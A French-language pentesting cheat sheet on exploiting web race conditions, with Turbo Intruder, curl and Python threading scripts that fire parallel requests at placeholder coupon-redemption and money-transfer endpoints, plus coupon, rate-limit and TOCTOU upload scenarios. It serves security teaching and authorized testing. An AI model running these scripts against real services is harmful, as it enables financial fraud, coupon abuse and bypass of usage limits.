# ⚡ Fiche pratique sur les conditions de concurrence (race conditions)

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

> **Précisions sur les exemples :** le callback Turbo Intruder présenté dans la source ne correspond pas à l’[exemple officiel](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/basic.py), qui reçoit un indicateur en second argument et utilise les données de la requête. Le code original est conservé ; il ne constitue pas un script vérifié. Les menus de Repeater dépendent de la version ; voir l’[envoi groupé officiel](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group).
>
> **Interprétation :** démarrer plusieurs threads ou processus ne garantit pas que les requêtes atteignent exactement le même instant critique. Un statut 200 ne démontre pas à lui seul un effet métier répété. Les scénarios de coupons, de limites et de fichiers sont illustratifs ; leurs résultats et prérequis doivent être établis dans le contexte réel. Aucun exemple n’est exécuté et le dessin ASCII reste celui de la source.


## 🎯 Que sont les conditions de concurrence ?

Les **conditions de concurrence** (race conditions) apparaissent lorsque l’ordre ou le moment d’exécution des opérations peut être exploité, notamment dans les failles où une vérification est suivie d’une utilisation (check-then-use).

### Conséquences
- 💰 **Fraude financière** — Utilisations répétées d’un même avantage
- 🎫 **Abus de coupons** — Utiliser plusieurs fois le même code
- 👤 **Élévation de privilèges** — Contourner des vérifications
- 📂 **Écrasement de fichiers** — Attaques TOCTOU (décalage entre vérification et utilisation)

---

## 🔍 Cibles courantes

```
- Utilisation de coupons et de codes promotionnels
- Systèmes de votes et de mentions « J’aime »
- Virements
- Opérations soumises à des limites
- Téléversements de fichiers
- Réinitialisation de mot de passe
- Vérification de l’authentification à deux facteurs (2FA)
- Création de compte
```

---

## 💉 Techniques d’exploitation

### Burp Suite Turbo Intruder

```python
# Envoyer plusieurs exemplaires de la requête en parallèle
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (manuellement)
```
1. Envoyer la requête vers Repeater
2. Dupliquer l’onglet 20 fois ou plus
3. Créer un groupe d’onglets
4. Cliquer sur "Send group (parallel)" pour envoyer le groupe en parallèle
```

### Requêtes curl en parallèle
```bash
# Envoyer 20 requêtes en parallèle
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Avec des données POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Threads Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Démarrer les threads (la source indique « tous à la fois »)
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Scénarios courants

### Concurrence sur un code promotionnel
```
1. Coupon = réduction de 50%
2. Fonctionnement normal : une seule utilisation
3. Concurrence : 10 utilisations simultanées
4. Résultat illustratif : 10 commandes avec une réduction de 50%
```

### Contournement d’une limite
```
1. Limite : 3 téléchargements par jour
2. Concurrence : demander 10 téléchargements à la fois
3. Les vérifications ont lieu simultanément
4. Résultat illustratif : les 10 réussissent avant l’application de la limite
```

### Concurrence lors d’un téléversement (TOCTOU)
```
1. Téléverser un fichier → il est considéré comme sûr après vérification
2. Avant son déplacement, le remplacer par un fichier malveillant
3. Le serveur déplace alors le fichier malveillant
```

---

## 🛠️ Outils

| Outil | Utilité |
|------|---------|
| **Turbo Intruder** | Extension Burp pour envoyer des requêtes en parallèle |
| **race-the-web** | Outil Go pour les conditions de concurrence |
| **racepwn** | Outil Python pour les conditions de concurrence |

---

## 📚 Ressources

- [Conditions de concurrence — PortSwigger](https://portswigger.net/web-security/race-conditions)
- [TOCTOU — OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Exploitez les décalages de synchronisation !</b><br>
  <i>Réservé aux tests autorisés !</i>
</p>
